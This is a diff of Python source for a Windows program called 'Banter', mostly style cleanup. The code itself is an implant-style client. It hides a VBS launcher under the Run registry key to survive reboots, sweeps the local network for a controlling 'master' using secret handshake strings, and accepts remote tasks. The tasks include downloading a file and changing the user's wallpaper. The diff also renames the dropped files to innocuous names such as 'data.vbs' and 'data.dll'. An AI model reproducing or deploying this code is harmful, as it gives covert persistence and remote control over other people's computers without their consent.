@@ -9,8 +9,11 @@ import time
 import io
 import os
 
-import win32api, win32con, win32gui
+import win32api
+import win32con
+import win32gui
 import win32com.client
+
 
 class Banter():
 
@@ -18,9 +21,10 @@ class Banter():
         if debug_build:
             logging.basicConfig(level=logging.DEBUG)
             logging.debug("Debug build")
-        else: 
+        else:
             logging.basicConfig(level=logging.CRITICAL)
-        self.PERSISTENCE_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        self.PERSISTENCE_KEY = """Software\\Microsoft\\Windows\\
+                               CurrentVersion\\Run"""
         self.REG_KEY_ENTRY = "slash"
         self.PORT = 34072
         self.TASKING_PORT = 34073
@@ -29,12 +33,11 @@ class Banter():
         self.FIND_MASTER_LIMIT = 16
         if logging.getLogger().level == logging.DEBUG:
             self.MASTER_SEARCH_SLEEP = 10
-            # self.TASKING_SLEEP = 20
         else:
             self.MASTER_SEARCH_SLEEP = 60
-            # self.TASKING_SLEEP = 60
         # How many empty tasking windows before trying to find master again
-        self.LAST_HEARD_LIMIT = 60      # 10 minutes (60 * 10sec tasking window)
+        # 60 * tasking window (10) = 10 minutes
+        self.LAST_HEARD_LIMIT = 60
         # How many times to attempt a connection before aborting
         self.CONNECTION_ATTEMPT_LIMIT = 5
 
@@ -52,7 +55,9 @@ class Banter():
 
     def get_name(self):
         try:
-            key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName",0,win32con.KEY_QUERY_VALUE)
+            key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,
+                                        """SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName""",
+                                        0, win32con.KEY_QUERY_VALUE)
             name = win32api.RegQueryValueEx(key, "ComputerName")[0]
             win32api.RegCloseKey(key)
         except:
@@ -61,30 +66,33 @@ class Banter():
 
     def persist(self, persist):
         dir_name = os.path.dirname(os.path.abspath(__file__))
-        vbs_script_file = os.path.join(dir_name, "slashd2.vbs")
+        vbs_script_file = os.path.join(dir_name, "data.vbs")
         if persist:
             if not os.path.exists(vbs_script_file):
                 curr_file = win32api.GetModuleFileName(0)
                 vbs_script = open(vbs_script_file, "w")
-                vbs_script.write('Dim WShell\nSet WShell = CreateObject("Wscript.Shell")\nWShell.Run "{0} r", 0\nSet WShell = Nothing'.format(curr_file))
+                vbs_script.write('Dim WShell\nSet WShell = CreateObject("Wscript.Shell")\nWShell.Run "{0} r", 0\nSet WShell = Nothing'.format(curr_file))   # nopep8
                 vbs_script.close()
-                startup_script ="wscript \"{0}\"".format(vbs_script_file)
+                startup_script = "wscript \"{0}\"".format(vbs_script_file)
                 curr_script = None
                 try:
-                    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,self.PERSISTENCE_KEY,0,win32con.KEY_QUERY_VALUE)
+                    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, self.PERSISTENCE_KEY, 0,
+                                                win32con.KEY_QUERY_VALUE)
                     curr_script = win32api.RegQueryValueEx(key, self.REG_KEY_ENTRY)
                     win32api.RegCloseKey(key)
-                except Exception as e: 
+                except Exception as e:
                     logging.exception("Unhandled Exception: {0}".format(e))
                 # if curr_script is None (no value) or incorrect, replace with correct one
                 if startup_script != curr_script:
                     logging.debug("Adding {0} to run on startup...".format(curr_file))
                     logging.debug("Script executed by registry key on boot: {0}".format(startup_script))
                     try:
-                        key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,self.PERSISTENCE_KEY,0,win32con.KEY_SET_VALUE)
-                        win32api.RegSetValueEx(key, self.REG_KEY_ENTRY, 0, win32con.REG_SZ, "{0}".format(startup_script))
+                        key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, self.PERSISTENCE_KEY, 0,
+                                                    win32con.KEY_SET_VALUE)
+                        win32api.RegSetValueEx(key, self.REG_KEY_ENTRY, 0, win32con.REG_SZ,
+                                               "{0}".format(startup_script))
                         win32api.RegCloseKey(key)
-                    except Exception as e: 
+                    except Exception as e:
                         logging.exception("Unhandled Exception: {0}".format(e))
         else:
             logging.debug("Removing from startup...")
@@ -95,10 +103,11 @@ class Banter():
                 except Exception as e:
                     logging.exception("Unhandled Exception: {0}".format(e))
             try:
-                key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,self.PERSISTENCE_KEY,0,win32con.KEY_SET_VALUE)
+                key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, self.PERSISTENCE_KEY, 0,
+                                            win32con.KEY_SET_VALUE)
                 win32api.RegDeleteValue(key, self.REG_KEY_ENTRY)
                 win32api.RegCloseKey(key)
-            except Exception as e: 
+            except Exception as e:
                 logging.exception("Unhandled Exception: {0}".format(e))
 
     """ Link up with master """
@@ -118,12 +127,6 @@ class Banter():
                 ips = self.determine_addresses()
             except:
                 return False
-            # if logging.getLogger().level == logging.DEBUG:
-            # #     # ips = [self.client_interface.ip]
-            # ips = [ipaddress.IPv4Address('10.0.0.128')]
-            # else:
-            # ips = self.ping_sweep(ips)
-            # logging.debug("Master candidates:" + str(ips))
             for address in ips:
                 if self.attempt_linkup(sock, address):
                     logging.debug("Master found: {0}".format(address))
@@ -133,7 +136,7 @@ class Banter():
             if self.find_master_window < self.FIND_MASTER_LIMIT:
                 logging.debug("Increasing socket timeout")
                 self.find_master_window *= 2
-                    
+
         sock.close()
         return False
 
@@ -147,7 +150,8 @@ class Banter():
             self.gateway, interface_uuid = self.determine_gateway()
 
         interface = netifaces.ifaddresses(interface_uuid)
-        self.client_interface = ipaddress.ip_interface('{0}/{1}'.format(interface[netifaces.AF_INET][0]['addr'],interface[netifaces.AF_INET][0]['netmask']))
+        self.client_interface = ipaddress.ip_interface('{0}/{1}'.format(interface[netifaces.AF_INET][0]['addr'],
+                                                                        interface[netifaces.AF_INET][0]['netmask']))
         self.client_network = ipaddress.ip_network(self.client_interface.network)
         logging.debug("Client ip: {0}".format(self.client_interface))
         return list(self.client_network.hosts())
@@ -169,7 +173,8 @@ class Banter():
     def determine_gateway2(self):
         try:
             logging.debug("Using tracert to determine gateway address...")
-            output = subprocess.Popen(['tracert', '-4', '-d', '-h', '1', 'google.com'], stdout=subprocess.PIPE).communicate()[0]
+            output = subprocess.Popen(['tracert', '-4', '-d', '-h', '1', 'google.com'],
+                                      stdout=subprocess.PIPE).communicate()[0]
             # Get rid of the heading crap and retrieve the first entry which contains the gateway IP
             i_gw = output.split(b"\r\n")[4].split()[-1].decode()
 
@@ -185,41 +190,26 @@ class Banter():
             logging.debug(" * Failed!")
             raise
 
-    # """ Reduce ip set to hosts that are pingable """
-    # def ping_sweep(self, ips):
-    #     logging.debug("Pinging hosts...")
-    #     online_ips = []
-    #     for ip in ips:
-    #         output = subprocess.Popen(['ping', '-n', '1', '-w', '{0}'.format(self.ping_timeout), str(ip)], stdout=subprocess.PIPE).communicate()[0]
-    #         if "Destination host unreachable" in output.decode('utf-8'):
-    #             pass
-    #         elif "Request timed out" in output.decode('utf-8'):
-    #             pass
-    #         else:
-    #             logging.debug("* {0}".format(ip))
-    #             online_ips.append(ip)
-    #     return online_ips
-
-        
     """ Attempt link-up with address """
     def attempt_linkup(self, sock, address):
         logging.debug("Attempting linkup: {0}".format(address))
         try:
             sock.sendto(b"Speak friend and enter", (str(address), self.PORT))
-            logging.debug("{0} < '{1}'".format(str(address),b"Speak friend and enter"))
+            logging.debug("{0} < '{1}'".format(str(address), b"Speak friend and enter"))
             data, addr = sock.recvfrom(self.BUFFER_SIZE)
-            logging.debug("{0} > '{1}'".format(addr[0],data))
+            logging.debug("{0} > '{1}'".format(addr[0], data))
 
             if data == b"RockMelon69":
                 self.master = addr[0]
                 info = bytes(self.name + "BossTha", "ascii")
                 sock.sendto(info, addr)
-                logging.debug("{0} < '{1}'".format(addr[0],info))
+                logging.debug("{0} < '{1}'".format(addr[0], info))
                 return True
         except:
             pass
         return False
 
+    """ Receive and acknowledge tasking from master """
     def process_tasking(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(self.TASKING_WINDOW)
@@ -248,24 +238,6 @@ class Banter():
         sock.close()
         return False
 
-    """ Receive and acknowledge tasking from master """
-    """ OLD METHOD: Requires client to have listening port """
-    def process_tasking_old(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(self.TASKING_WINDOW)
-        sock.bind(('', self.TASKING_PORT))
-        data, addr = sock.recvfrom(self.BUFFER_SIZE)
-        logging.debug("{0} > {1}".format(addr[0], data))
-        if addr[0] == self.master:
-            ack = data[:4] + b"BossTha"
-            logging.debug("{0} < {1}".format(addr[0], ack))
-            sock.sendto(ack, addr)
-            if self.parse_task(str(data, "ascii")):
-                self.send_task_result(True)
-            else:
-                self.send_task_result(False)
-        sock.close()
-
     """ Parse and action tasks """
     def parse_task(self, task):
         task = task.split(",")
@@ -281,7 +253,7 @@ class Banter():
             self.persist_task()
         else:
             pass
-    
+
     def send_task_result(self, result):
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
@@ -289,7 +261,7 @@ class Banter():
                     sock.sendto(b"Jobs done!", (self.master, self.PORT))
                 else:
                     sock.sendto(b"Nope", (self.master, self.PORT))
-        except Exception as e: 
+        except Exception as e:
             logging.exception("Unhandled Exception: {0}".format(e))
 
     """ Change background task """
@@ -324,12 +296,10 @@ class Banter():
         except Exception as e:
             logging.warning("Unhandled Exception: {0}".format(e))
             return False
-        try:    
+        try:
             file_sock.send(b"plsehlp")
             logging.debug("{0} < '{1}'".format(self.master, b"plsehlp"))
-            
-            # image = io.BytesIO()
-            image = open("d2music2.dll", "wb")
+            image = open("data.dll", "wb")
             data = file_sock.recv(self.BUFFER_SIZE)
             while data:
                 image.write(data)
@@ -347,7 +317,8 @@ class Banter():
     def set_background(self, image):
         logging.debug("Setting background to: {0}".format(image))
         try:
-            key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,"Control Panel\\Desktop",0,win32con.KEY_SET_VALUE)
+            key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, "Control Panel\\Desktop", 0,
+                                        win32con.KEY_SET_VALUE)
             win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "2")
             win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
             win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, image, 1+2)
@@ -401,8 +372,6 @@ class Banter():
                     else:
                         logging.debug("No tasking received.")
                         last_heard += 1
-                    # except Exception as e:
-                    #     logging.debug("Exception: {0}".format(e))
                 logging.debug("No tasking received for too long. Relinking with master.")
             time.sleep(self.MASTER_SEARCH_SLEEP)
 
